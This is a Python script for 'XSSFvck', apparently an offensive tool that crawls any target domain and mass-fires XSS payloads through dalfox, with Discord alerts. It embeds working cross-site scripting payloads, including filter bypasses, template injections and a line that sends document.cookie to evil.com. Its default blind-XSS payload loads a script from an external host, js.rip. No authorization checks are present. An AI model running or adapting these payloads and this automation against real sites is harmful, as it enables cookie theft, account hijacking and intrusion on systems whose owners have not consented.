#!/usr/bin/env python3

import subprocess
import os
import logging
import threading
import argparse
import re
import time
import json
import random
import requests
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
from bs4 import BeautifulSoup

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ANSI color codes
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

logger = logging.getLogger("XSSFvck")

# XSS payloads
XSS_PAYLOADS = [
    # Basic payloads
    '"><svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'"()&%<acx><ScRiPt>alert(1)</ScRiPt>',
    
    # AngularJS payloads
    '{{constructor.constructor(\'alert(1)\')()}}',
    '{{[].pop.constructor(\'alert(1)\')()}}',
    
    # Vue.js payloads
    '{{_openBlock.constructor(\'alert(1)\')()}}',
    
    # DOM-based payloads
    '"><script>fetch(\'https://evil.com?\'+document.cookie)</script>',
    '"><video><source onerror=alert(1)>',
    
    # Filter bypass payloads
    '"`\'><img src=x onerror=javascript:alert(1)>',
    '"><svg><animate onbegin=alert(1) attributeName=x>',
    
    # HTML5 payloads
    '"><details ontoggle=alert(1)>',
    '"><svg><script>alert&#40;1&#41;</script>',
    
    # Encoded payloads
    'javascript:eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))',
    '"><img src=x onerror=eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))>',
]

# DOM XSS patterns
DOM_XSS_PATTERNS = [
    'document.URL',
    'document.documentURI',
    'document.location',
    'location.href',
    'location.search',
    'location.hash',
    'document.referrer',
    'window.name',
    'eval(',
    'setTimeout(',
    'setInterval(',
    'document.write(',
    'document.writeIn(',
    'innerHTML',
    'outerHTML',
]

def print_message(color, message):
    """Print colored messages"""
    print(f"{color}{message}{RESET}")

def banner():
    """Display tool banner"""
    print(f"""
{CYAN}╔════════════════════════════════════════════════╗
║   {WHITE}XSSFvck v0.0 {CYAN}- {GREEN}Advanced XSS Scanning Tool{CYAN}                
║                                                              
║       {RED}Created by anonre {CYAN}| {RED}Fvck3r Version{CYAN}                     
║                                                              
║   {YELLOW}══════════════════════════════{RESET}{CYAN}                 
║     {CYAN}Advanced XSS Detection                                     
╚═══════════════════════════════════════╝{RESET}
""")
    print(f"{MAGENTA}[*] Features: DOM XSS Detection, Payload Mutation, Smart Filtering{RESET}\n")

def safe_open_w(path):
    """Safely open a file for writing with directory creation"""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    return open(path, 'w')

def command_exists(cmd):
    """Check if a command exists in the system"""
    try:
        subprocess.run(f"command -v {cmd}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

def check_dependencies():
    """Check if required tools are installed"""
    dependencies = ["gau", "gf", "uro", "Gxss", "kxss", "dalfox", "waybackurls", "hakrawler"]
    missing = []
    
    for cmd in dependencies:
        if not command_exists(cmd):
            missing.append(cmd)
    
    if missing:
        print_message(RED, f"[!] Missing dependencies: {', '.join(missing)}")
        print_message(YELLOW, "[*] Installation commands:")
        
        for cmd in missing:
            if cmd == "gau":
                print("  - GO111MODULE=on go install github.com/lc/gau/v2/cmd/gau@latest")
            elif cmd == "gf":
                print("  - GO111MODULE=on go install github.com/tomnomnom/gf@latest")
            elif cmd == "uro":
                print("  - pip install uro")
            elif cmd == "Gxss":
                print("  - GO111MODULE=on go install github.com/KathanP19/Gxss@latest")
            elif cmd == "kxss":
                print("  - GO111MODULE=on go install github.com/Emoe/kxss@latest")
            elif cmd == "dalfox":
                print("  - GO111MODULE=on go install github.com/hahwul/dalfox/v2@latest")
            elif cmd == "waybackurls":
                print("  - GO111MODULE=on go install github.com/tomnomnom/waybackurls@latest")
            elif cmd == "hakrawler":
                print("  - GO111MODULE=on go install github.com/hakluke/hakrawler@latest")
        
        sys.exit(1)

def run_command(cmd, check=False):
    """Run a shell command with error handling"""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=check
        )
        return result
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e.cmd}")
        logging.error(f"Error output: {e.stderr}")
        return None
    except Exception as e:
        logging.error(f"Unexpected error running command: {e}")
        return None

def crawl_target(target, output_dir):
    """Crawl target domain for URLs"""
    try:
        print_message(BLUE, f"[*] Crawling target: {target}")
        crawl_output = f"{output_dir}/crawled_urls.txt"
        
        # Using multiple tools for better coverage
        print_message(YELLOW, "[*] Running gau...")
        run_command(f"echo {target} | gau --threads 10 | tee -a {crawl_output}")
        
        print_message(YELLOW, "[*] Running waybackurls...")
        run_command(f"echo {target} | waybackurls | tee -a {crawl_output}")
        
        print_message(YELLOW, "[*] Running hakrawler...")
        run_command(f"echo {target} | hakrawler -depth 3 -scope subs | tee -a {crawl_output}")
        
        # Filter unique URLs
        run_command(f"sort -u {crawl_output} -o {output_dir}/all_urls.txt")
        
        print_message(GREEN, f"[✓] Crawling completed. URLs saved to {output_dir}/all_urls.txt")
        return f"{output_dir}/all_urls.txt"
    except Exception as e:
        logging.error(f"Error during crawling: {e}")
        return None

def filter_xss_vectors(all_urls_file, output_dir):
    """Filter URLs for potential XSS vectors"""
    try:
        print_message(BLUE, "[*] Filtering URLs for potential XSS vectors")
        
        # Using gf patterns
        run_command(f"cat {all_urls_file} | gf xss > {output_dir}/xss_vectors.txt")
        
        # Additional filtering
        run_command(f"cat {output_dir}/xss_vectors.txt | uro > {output_dir}/xss_filtered.txt")
        run_command(f"cat {output_dir}/xss_filtered.txt | Gxss -c 100 -p Gxss > {output_dir}/gxss_output.txt")
        run_command(f"cat {output_dir}/gxss_output.txt | kxss > {output_dir}/final_candidates.txt")
        
        print_message(GREEN, f"[✓] XSS candidates identified and saved to {output_dir}/final_candidates.txt")
        return f"{output_dir}/final_candidates.txt"
    except Exception as e:
        logging.error(f"Error during XSS vector filtering: {e}")
        return None

def send_discord_notification(message, webhook_url=None):
    """Send notification to Discord webhook"""
    try:
        if not webhook_url:
            config_file = "config.json"
            if os.path.exists(config_file):
                try:
                    with open(config_file, "r") as f:
                        config = json.load(f)
                        webhook_url = config.get("discord_webhook_url")
                except Exception as e:
                    logging.error(f"Failed to read config file: {e}")
                    return False

        if not webhook_url:
            logging.error("No Discord webhook URL provided or found in config")
            return False

        payload = {
            "embeds": [{
                "description": message,
                "color": 16711680,  # Red color
                "timestamp": datetime.now().isoformat()
            }]
        }

        response = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        if response.status_code == 204:
            print_message(YELLOW, "[+] Discord notification sent successfully")
            return True
        else:
            print_message(RED, f"[!] Failed to send Discord notification. Status code: {response.status_code}")
            return False

    except Exception as e:
        logging.error(f"Error sending Discord notification: {e}")
        print_message(RED, f"[!] Error sending Discord notification: {e}")
        return False

def run_dalfox_validation(targets_file, output_dir, custom_payload=None):
    """Run enhanced XSS validation with reliable result checking."""
    try:
        print_message(GREEN, "[*] Running enhanced XSS validation with Dalfox...")
        
        os.makedirs(output_dir, exist_ok=True)
        
        discord_webhook_url = None
        if os.path.exists("config.json"):
            try:
                with open("config.json", "r") as config_file:
                    config = json.load(config_file)
                    discord_webhook_url = config.get("discord_webhook_url")
                    if discord_webhook_url:
                        print_message(BLUE, "[*] Discord webhook URL loaded from config.json")
                    else:
                        print_message(YELLOW, "[!] No webhook URL found in config.json")
            except Exception as e:
                logging.error(f"Error reading config.json: {e}")

        processed_targets_file = os.path.join(output_dir, "processed_targets.txt")
        print_message(BLUE, "[*] Preprocessing target URLs...")
        with open(targets_file, 'r') as original, open(processed_targets_file, 'w') as processed:
            for line in original:
                if line.strip().startswith("URL: "):
                    line = line.replace("URL: ", "", 1)
                processed.write(line)
        
        payloads_file = os.path.join(output_dir, "payloads.txt")
        with open(payloads_file, 'w') as f:
            if custom_payload:
                f.write(custom_payload + "\n")
            else:
                f.write('"><script src=\"https://js.rip/px592rfcv0\"></script>\n')
            for payload in XSS_PAYLOADS:
                f.write(payload + "\n")

        results_json_path = os.path.join(output_dir, 'final_results.json')
        cmd = (
            f"dalfox file {processed_targets_file} "
            f"--format json "
            f"--skip-mining-dict "
            f"--skip-bav "
            f"--mass-worker 30 "
            f"--custom-payload {payloads_file} "
            f"--ignore-return 302,404,400,500,501,502,503 "
            f"--user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' "
            f"-o {results_json_path}"
        )

        print_message(BLUE, f"[*] Executing Dalfox: {cmd}")
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)

        # Real-time monitoring of stdout for vulnerabilities
        for line in process.stdout:
            line = line.strip()
            print(f"{RED}[Dalfox] {line}{RESET}")
            
            if '"type":"V"' in line and discord_webhook_url:
                message = f"**New XSS Vulnerability Detected!**\n\n**Details:**\n```json\n{line}\n```"
                send_discord_notification(message, discord_webhook_url)

        # Wait for completion and capture final output
        _, stderr_data = process.communicate()
        exit_code = process.returncode

        # The most reliable check for success is if the output file was created.
        if os.path.exists(results_json_path) and os.path.getsize(results_json_path) > 0:
            print_message(GREEN, "[+] Dalfox scan complete. Processing results.")
            process_results(results_json_path, output_dir)
        else:
            print_message(RED, f"[!] Dalfox validation failed. No results file was generated.")
            logging.error(f"Dalfox exited with code {exit_code} and produced no results.")
            if stderr_data:
                logging.error(f"Dalfox stderr: {stderr_data.strip()}")
                print_message(RED, f"[Dalfox Error Output]:\n{stderr_data.strip()}")
            create_empty_results(output_dir)
            
    except Exception as e:
        logging.error(f"An exception occurred during Dalfox validation: {e}", exc_info=True)
        print_message(RED, f"[!] An exception occurred during Dalfox validation: {e}")
        create_empty_results(output_dir)

def process_results(results_json_path, output_dir):
    """Process scan results and generate a text report."""
    try:
        results = []
        with open(results_json_path, "r") as f:
            for line in f:
                if line.strip():
                    try:
                        result = json.loads(line)
                        if result and result.get("type") == "vulnerable":
                            results.append(result)
                    except json.JSONDecodeError:
                        continue
        
        with safe_open_w(f"{output_dir}/readable_results.txt") as f:
            f.write("XSSFvck - Detailed Vulnerability Report\n")
            f.write("=" * 37 + "\n\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total Vulnerabilities Found: {len(results)}\n\n")
            
            if not results:
                f.write("No vulnerabilities were found.\n")
                print_message(GREEN, "Scan finished. No vulnerabilities found.")
                return

            for i, result in enumerate(results, 1):
                f.write(f"--- Vulnerability #{i} ---\n")
                f.write(f"URL: {result.get('url', 'N/A')}\n")
                f.write(f"Payload: {result.get('payload', 'N/A')}\n")
                if 'poc' in result:
                    f.write(f"PoC: {result['poc']}\n")
                f.write("\n")
            print_message(GREEN, f"✓ Report generated at {output_dir}/readable_results.txt")
        
    except Exception as e:
        logging.error(f"Error processing results: {e}", exc_info=True)
        create_empty_results(output_dir)

def create_empty_results(output_dir):
    """Create empty result files in case of failure."""
    try:
        os.makedirs(output_dir, exist_ok=True)
        with safe_open_w(f"{output_dir}/readable_results.txt") as f:
            f.write("XSSFvck - Vulnerability Report\n")
            f.write("="*30 + "\n\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("Scan failed or no vulnerabilities were found.\n")
    except Exception as e:
        logging.error(f"Error creating empty results: {e}")

def process_single_target(target, output_dir, threads, custom_payload):
    """Process a single target."""
    try:
        os.makedirs(output_dir, exist_ok=True)
        
        file_handler = logging.FileHandler(f"{output_dir}/XSSFvck.log")
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        
        print_message(GREEN, f"[*] Starting scan on {target}")
        all_urls_file = crawl_target(target, output_dir)
        if not all_urls_file or os.path.getsize(all_urls_file) == 0:
            print_message(RED, "[!] Failed to crawl target or no URLs found.")
            return
        
        candidates_file = filter_xss_vectors(all_urls_file, output_dir)
        if not candidates_file or os.path.getsize(candidates_file) == 0:
            print_message(YELLOW, "[*] No potential XSS candidates found after filtering. Scan complete.")
            create_empty_results(output_dir) # Create a clean "no findings" report
            return
        
        run_dalfox_validation(candidates_file, output_dir, custom_payload)
        
        print_message(GREEN, f"[✓] Scan completed for {target}")
        print_message(BLUE, f"[*] Results saved in: {output_dir}")
        
    except Exception as e:
        logging.error(f"Error processing target {target}: {e}", exc_info=True)

def main():
    """Main function."""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        
        parser = argparse.ArgumentParser(
            description=f"{CYAN}XSSFvck{RESET} - Advanced XSS Scanning Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
        
        parser.add_argument("-t", "--target", help="Single target to scan (e.g., example.com)")
        parser.add_argument("-l", "--list", help="File containing multiple targets")
        parser.add_argument("-o", "--output", help="Output directory for results")
        parser.add_argument("-p", "--payload", help="Custom XSS payload")
        parser.add_argument("-T", "--threads", type=int, default=10, help="Number of threads for crawling (default: 10)")
        
        args = parser.parse_args()
        
        if not args.target and not args.list:
            parser.print_help()
            sys.exit(1)

        check_dependencies()

        if args.target:
            output_dir = args.output if args.output else f"results/{args.target.replace('://', '_').replace('/', '_')}"
            process_single_target(args.target, output_dir, args.threads, args.payload)
        
        elif args.list:
            if not os.path.exists(args.list):
                print_message(RED, f"[!] Target list file not found: {args.list}")
                sys.exit(1)
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
            for target in targets:
                output_dir = f"results/{target.replace('://', '_').replace('/', '_')}"
                process_single_target(target, output_dir, args.threads, args.payload)

    except KeyboardInterrupt:
        print_message(YELLOW, "\n[!] Scan interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print_message(RED, f"\n[!] An unexpected error occurred: {str(e)}")
        logging.error("Top-level error", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    main()
